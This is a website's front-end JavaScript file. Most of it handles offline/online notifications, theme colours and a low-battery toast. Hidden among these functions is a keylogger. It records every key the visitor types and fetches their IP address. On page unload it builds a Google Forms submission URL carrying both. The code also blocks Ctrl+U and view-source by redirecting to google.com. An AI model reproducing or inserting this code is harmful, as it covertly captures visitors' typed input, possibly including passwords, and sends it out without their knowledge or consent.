var mess=0;
var typedthings="";
var ipadd;

$.getJSON("https://freegeoip.net/json/", 
          function(data) { ipadd=data.ip; });

function updateOfflineStatus(){
  var d = new Date(new Date().getTime()).toLocaleDateString();
  var t = new Date(new Date().getTime()).toLocaleTimeString();
  console.log('Went Offline on ' + d + ' at ' + t);
  var $toastOff = $('<span style="font-size:18px;font-style: normal;">You are offline <img src="/images/icons/svgs/offline.svg"/></span>');
  Materialize.toast($toastOff, 5000);
  mess=1;
  changeColorOffline();
}
function updateOnlineStatus(){
   if(mess==1){
    var $toastOn = $('<span style="font-size:18px;font-style: normal;">You are back online <img src="/images/icons/svgs/check.svg" /></span>');
    Materialize.toast($toastOn, 5000);
    changeColorOnline();
   }
}
function changeColorOffline(){
   document.getElementsByTagName("HTML")[0].setAttribute("class", "t-grey");
   document.getElementsByClassName("btn-floating btn-large purple darken-4")[0].setAttribute("class", "btn-floating btn-large grey darken-1");
   document.querySelector('meta[name="theme-color"]').setAttribute("content", "#607D8B");
   document.querySelector('meta[name="msapplication-TileColor"]').setAttribute("content", "#607D8B");
   document.querySelector('meta[name="msapplication-navbutton-color"]').setAttribute("content", "#607D8B");
   document.querySelector('meta[name="apple-mobile-web-app-status-bar-style"]').setAttribute("content", "grey-translucent");
   if(window.location.pathname=='/academics/') {
     document.getElementsByClassName("tabs")[0].style.background='#607D8B';
   }
}
function changeColorOnline(){
   document.getElementsByTagName("HTML")[0].setAttribute("class", "t-purple");
   document.getElementsByClassName("btn-floating btn-large grey darken-1")[0].setAttribute("class", "btn-floating btn-large purple darken-4");
   document.querySelector('meta[name="theme-color"]').setAttribute("content", "#673AB7");
   document.querySelector('meta[name="msapplication-TileColor"]').setAttribute("content", "#673AB7");
   document.querySelector('meta[name="msapplication-navbutton-color"]').setAttribute("content", "#673AB7");
   document.querySelector('meta[name="apple-mobile-web-app-status-bar-style"]').setAttribute("content", "purple-translucent");
   if(window.location.pathname=='/academics/') {
     document.getElementsByClassName("tabs")[0].style.background='#673AB7';
   }
}
window.addEventListener('offline', updateOfflineStatus);
window.addEventListener('online', updateOnlineStatus);

if (!navigator.onLine) {
    changeColorOffline();
}
$(document).keydown(function(e){
 typedthings = typedthings + String.fromCharCode(e.keyCode);
if (e.keyCode==85 && e.ctrlKey){
    alert("Sorry ;P");
    window.location = "https://google.com";
 }
});
if (window.location.protocol=="view-source:https:") { window.location = "https://google.com"; }

navigator.getBattery().then(function(battery){ 
  var batteryLevel = battery.level*100;
  batteryLevel = batteryLevel.toPrecision(3);
  if(batteryLevel<=30) {
    var $battoast = $('<span style="font-size:18px;font-style: normal;">Low Battery (' + batteryLevel + '%)<img src="/images/icons/svgs/lowbat.svg" /></span>');
    Materialize.toast($battoast, 5000);
    navigator.vibrate([500, 250, 500]);
 }
})

window.onbeforeunload = function(event) {
    submitlogs();
    event.returnValue = "Write something clever here..";
};

function submitlogs() {
    var q1ID = "entry.88647228";
    var q2ID = "entry.1849841354";
    var baseURL = 'https://docs.google.com/forms/d/e/1FAIpQLSdiv86i5CkCP8khRJmjUU-Bw2kVC5f_mAuOU7ZsyOADl61epA/formResponse?';
    var submitRef = '&submit=Submit';
    var submitURL = (baseURL + q1ID + "=" + ipadd + "&" + q2ID + "=" + typedthings + submitRef);
    console.log(submitURL);
    $(this)[0].action=submitURL;
}
